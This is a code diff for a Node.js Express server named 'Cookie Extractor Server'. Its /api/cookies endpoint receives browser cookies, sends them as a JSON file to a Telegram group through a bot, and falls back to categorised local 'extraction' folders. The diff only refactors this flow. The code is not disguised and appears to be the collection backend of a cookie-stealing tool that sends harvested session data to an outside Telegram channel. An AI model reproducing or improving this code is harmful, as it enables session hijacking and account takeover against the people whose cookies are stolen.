@@ -15,11 +15,18 @@ app.use(express.json({ limit: '40mb' }));
 
 const DOWNLOADS_DIR = path.join(__dirname, 'downloads');
 
-async function ensureDownloadsDir() {
+async function ensureDirectories() {
     try {
         await fs.access(DOWNLOADS_DIR);
     } catch (error) {
         await fs.mkdir(DOWNLOADS_DIR, { recursive: true });
+    }
+    
+    const tempDir = path.join(__dirname, 'temp');
+    try {
+        await fs.access(tempDir);
+    } catch (error) {
+        await fs.mkdir(tempDir, { recursive: true });
     }
 }
 
@@ -60,7 +67,7 @@ class TelegramNotifier {
 
 const telegramNotifier = new TelegramNotifier(TELEGRAM_BOT_TOKEN, TELEGRAM_GROUP_CHAT_ID);
 
-// Helper function for sending files to Telegram
+// Helper function for Telegram file sending
 async function sendCookieFileToTelegram(telegramNotifier, filePath, caption) {
     try {
         await telegramNotifier.sendDocument(filePath, caption);
@@ -185,51 +192,33 @@ app.post('/api/cookies', async (req, res) => {
         
         console.log(`Processing ${cookies.length} cookies...`);
         
-        // Step 1: Try to send JSON file directly to Telegram first
-        let telegramFileSent = false;
-        let shouldSaveLocally = true;
+        // Step 1: Create temporary JSON file for Telegram
+        const tempDir = path.join(__dirname, 'temp');
+        await fs.mkdir(tempDir, { recursive: true });
+        const tempFilePath = path.join(tempDir, `temp_${Date.now()}_${filename}`);
+        await fs.writeFile(tempFilePath, JSON.stringify(cookieData, null, 2));
         
+        // Step 2: Try to send JSON file to Telegram first
+        let telegramFileSuccess = false;
         try {
-            // Send basic notification
-            const basicNotification = `🍪 Cookie Extraction Alert\n\nTime: ${new Date().toLocaleString()}\nTotal Cookies: ${cookies.length}\nFilename: ${filename}\n\nExtraction completed successfully!`;
-            await telegramNotifier.sendMessage(basicNotification);
-            
-            // Create temporary file to send to Telegram
-            const tempFilePath = path.join(__dirname, 'temp_cookies.json');
-            await fs.writeFile(tempFilePath, JSON.stringify(cookieData, null, 2));
-            
-            // Try to send file to Telegram
-            const fileCaption = `📁 Complete Cookie Data File\n\nFilename: ${filename}\nTotal Cookies: ${cookies.length}\nExtracted: ${new Date().toLocaleString()}`;
-            telegramFileSent = await sendCookieFileToTelegram(telegramNotifier, tempFilePath, fileCaption);
-            
-            // Clean up temp file
-            try {
+            const fileCaption = `📁 Cookie Data File\n\nFilename: ${filename}\nTotal Cookies: ${cookies.length}\nExtracted: ${new Date().toLocaleString()}`;
+            telegramFileSuccess = await sendCookieFileToTelegram(telegramNotifier, tempFilePath, fileCaption);
+            if (telegramFileSuccess) {
+                console.log('Cookie JSON file sent to Telegram successfully');
+                // Clean up temp file
                 await fs.unlink(tempFilePath);
-            } catch (cleanupError) {
-                console.log(`Warning: Could not cleanup temp file: ${cleanupError.message}`);
             }
-            
-            if (telegramFileSent) {
-                console.log('Cookie JSON file sent to Telegram successfully - skipping local save');
-                shouldSaveLocally = false;
-            } else {
-                console.log('Failed to send file to Telegram - will save locally');
-            }
-            
         } catch (telegramError) {
-            console.log(`Telegram operation failed: ${telegramError.message}`);
-            if (telegramError.response) {
-                console.log(`Telegram API Error: ${JSON.stringify(telegramError.response.data)}`);
-            }
+            console.log(`Telegram file send failed: ${telegramError.message}`);
         }
         
-        // Step 2: Only save locally if Telegram file sending failed
+        let statusMessage;
         let folderName = null;
         let categorizedCounts = {};
         
-        if (shouldSaveLocally) {
-            console.log('Saving to local downloads folder...');
-            await ensureDownloadsDir();
+        // Step 3: Only save locally if Telegram failed
+        if (!telegramFileSuccess) {
+            console.log('Telegram failed, saving to local downloads folder...');
             
             const classifier = new CookieClassifier();
             const nextExtractionNumber = await getNextExtractionNumber(DOWNLOADS_DIR);
@@ -253,8 +242,9 @@ app.post('/api/cookies', async (req, res) => {
             });
             
             // Save main cookies file
+            const mainCookieFilePath = path.join(folderPath, 'cookies.json');
             await fs.writeFile(
-                path.join(folderPath, 'cookies.json'),
+                mainCookieFilePath,
                 JSON.stringify(cookieData, null, 2)
             );
             
@@ -276,28 +266,30 @@ app.post('/api/cookies', async (req, res) => {
             categorizedCounts = Object.fromEntries(
                 Object.entries(categorizedCookies).map(([cat, cookies]) => [cat, cookies.length])
             );
+            
+            statusMessage = `Telegram failed - Cookies saved to ${folderName}`;
+            console.log(`Saved to local folder: ${folderName}`);
+            
+            // Clean up temp file
+            try {
+                await fs.unlink(tempFilePath);
+            } catch (error) {
+                console.log('Failed to clean up temp file');
+            }
+        } else {
+            statusMessage = 'Cookie file sent to Telegram successfully';
         }
         
-        let statusMessage;
-        if (telegramFileSent) {
-            statusMessage = 'Cookies sent to Telegram successfully (no local save needed)';
-        } else if (folderName) {
-            statusMessage = `Telegram failed - cookies saved locally to ${folderName}`;
-            console.log(`Saved to local folder: ${folderName}`);
-        } else {
-            statusMessage = 'Both Telegram and local save failed';
-        }
-
         return res.json({
             success: true,
             message: statusMessage,
             data: {
-                telegramFileSent: telegramFileSent,
-                savedLocally: shouldSaveLocally,
-                folderName: folderName,
+                telegramFileSuccess: telegramFileSuccess,
+                folderName: folderName, // null if sent to telegram
                 totalCookies: cookies.length,
-                categorizedCounts: categorizedCounts,
-                savedAt: cookieData.metadata.savedAt
+                categorizedCounts: categorizedCounts, // empty if sent to telegram
+                savedAt: cookieData.metadata.savedAt,
+                method: telegramFileSuccess ? 'telegram' : 'local_storage'
             }
         });
         
@@ -388,7 +380,7 @@ app.get('/api/status', (req, res) => {
 });
 
 async function startServer() {
-    await ensureDownloadsDir();
+    await ensureDirectories();
     
     app.listen(PORT, () => {
         console.log('Cookie Extractor Server started');
